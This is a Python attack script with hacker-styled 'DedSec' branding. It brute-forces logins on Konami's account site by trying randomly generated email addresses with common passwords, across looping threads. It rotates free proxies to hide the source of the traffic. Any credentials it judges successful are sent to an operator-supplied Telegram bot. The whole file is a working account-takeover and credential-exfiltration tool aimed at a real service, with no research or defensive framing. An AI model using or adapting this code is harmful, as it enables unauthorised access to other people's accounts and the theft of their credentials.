# -*- coding: utf-8 -*-
import requests, time, os, threading, random, sys, telebot, string

# --- [ DEDSEC VISUAL PROTOCOL ] ---
P, C, R, G, W, X = "\033[38;5;93m", "\033[38;5;51m", "\033[1;31m", "\033[1;32m", "\033[1;37m", "\033[0m"

BANNER = f"""
{P}          ⣴⣾⣿⣿⣷⣦      {P}██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗ 
{P}         ⣾⣿⣿⣿⣿⣿⣿⣷     {P}██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝ 
{P}         ⣿⣿⣿⣿⣿⣿⣿⣿     {P}██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║      
{P}         ⣿⣿{W}⠿⠿{P}⣿⣿{W}⠿⠿{P}⣿⣿     {P}██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║      
{P}         ⢿⣿  {W}⠶{P}  {W}⠶{P}  ⣿⡿     {P}██████╔╝███████╗██████╔╝███████║███████╗╚██████╔╝ 
{P}          ⠙⠻⠾⠯⠽⠟⠋      {P}╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝ 
{P}          ⣠⣴⣶⣶⣶⣄       {C}   [!] R A N D O M _ B R E A C H [!]
{P}         ⣾⣿⣿⣿⣿⣿⣿⣷      {W}       [!] V O I D _ S A M P [!]
{P}        ⣸⣿⣿⣿⣿⣿⣿⣿⣿⣇     {R}███████████████████████████████████████
{W} ---------------------------------------------------------------------
 {R}█{W} STATUS: {R}INFILTRATING{W} {R}█{W} MODE: {C}RANDOM{W} {R}█{W} BOT: {P}ACTIVE{W} {R}█{W} DNS: {G}SAFE{W}
 {R}█████████████████████████████████████████████████████████████████████
"""

# --- [ GHOST GENERATOR ENGINE ] ---
def generate_random_account():
    """ Spawns random email patterns and passwords for brute-force """
    domains = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@mail.ru"]
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choice(chars) for _ in range(random.randint(6, 12)))
    email = user + random.choice(domains)
    # Common password patterns used in random breaches
    passwords = [user + "123", "password123", "konami123", "pes2026", user + "2024"]
    return email, random.choice(passwords)

def get_auto_proxy():
    """ Fetches a fresh mask for the attack """
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all", timeout=5)
        return random.choice(r.text.splitlines())
    except:
        return None

# --- [ CORE BREACH LOGIC ] ---
def send_to_tg(bot, chat_id, email, password):
    msg = f"{P}██ {W}D E D S E C  H I T {P}██\n{R}------------------------\n{W}ACC: {C}{email}\n{W}PSS: {C}{password}\n{R}------------------------\n{P}[!] STATUS: EXTRACTED"
    try: bot.send_message(chat_id, msg)
    except: pass

def breach_attempt(bot, chat_id, proxy_mode):
    email, password = generate_random_account()
    url = "https://my.konami.net/auth/login.html"
    headers = {'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X)'}
    data = {'konamiId': email, 'password': password, 'login': 'submit'}
    
    proxy = get_auto_proxy() if proxy_mode == "AUTO" else None
    prox_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

    try:
        res = requests.post(url, data=data, headers=headers, proxies=prox_dict, timeout=8)
        if "errorMessage" not in res.text and res.status_code == 200:
            print(f"{G}[✔] BREACH SUCCESS >> {W}{email}")
            send_to_tg(bot, chat_id, email, password)
        else:
            print(f"{R}[✘] FAILED >> {W}{email}")
    except:
        pass

# --- [ MAIN CONTROLLER ] ---
def main():
    os.system('clear')
    print(BANNER)
    
    tk = input(f"{P}┌──({C}DedSec{P})─[{W}Bot_Token{P}]\n└─{W}➤ ")
    id = input(f"{P}┌──({C}DedSec{P})─[{W}Chat_ID{P}]\n└─{W}➤ ")
    bot = telebot.TeleBot(tk)

    p_mode = input(f"{P}┌──({C}DedSec{P})─[{W}Proxy: 'AUTO' or 'NONE'{P}]\n└─{W}➤ ").upper()
    
    print(f"\n{C}[*] BOOTING RANDOM INFILTRATION ENGINE...{X}\n")
    
    while True:
        # Spawning 5 threads at a time for iSH stability
        threads = []
        for _ in range(5):
            t = threading.Thread(target=breach_attempt, args=(bot, id, p_mode))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        time.sleep(0.5) # Prevent iPad overheating

if __name__ == "__main__":
    main()
